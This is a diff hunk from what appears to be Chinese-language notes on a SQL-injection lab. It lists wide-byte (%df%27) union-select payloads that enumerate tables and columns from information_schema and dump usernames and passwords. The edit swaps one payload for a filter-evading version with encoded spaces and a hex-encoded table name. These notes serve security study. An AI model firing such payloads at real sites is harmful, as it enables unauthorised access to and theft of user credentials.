@@ -1256,5 +1256,5 @@ payload:`?id=100')union%0bselect%a01,2,3||('1`回显如下。所以1,2为输出�
 - 联合查询，判断各列输出的位置`payload:?id=-1%df%27 union select 1,2,3--+`
 - 获取数据库`payload:?id=-1%df%27 union select 1,database(),3--+`
 - 爆数据表`payload:?id=-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+`
-- 爆users表的数据字段`payload：?id=-1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+`
+- 爆users表的数据字段`payload：?id=-1%df%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=0x7573657273%20%23`
 - 在爆出的字段中里面看到了password和username，于是爆数据`?id=-1%df%27 union select 1,group_concat(username,'~',password),3 from users--+`username和password中间使用~来分隔
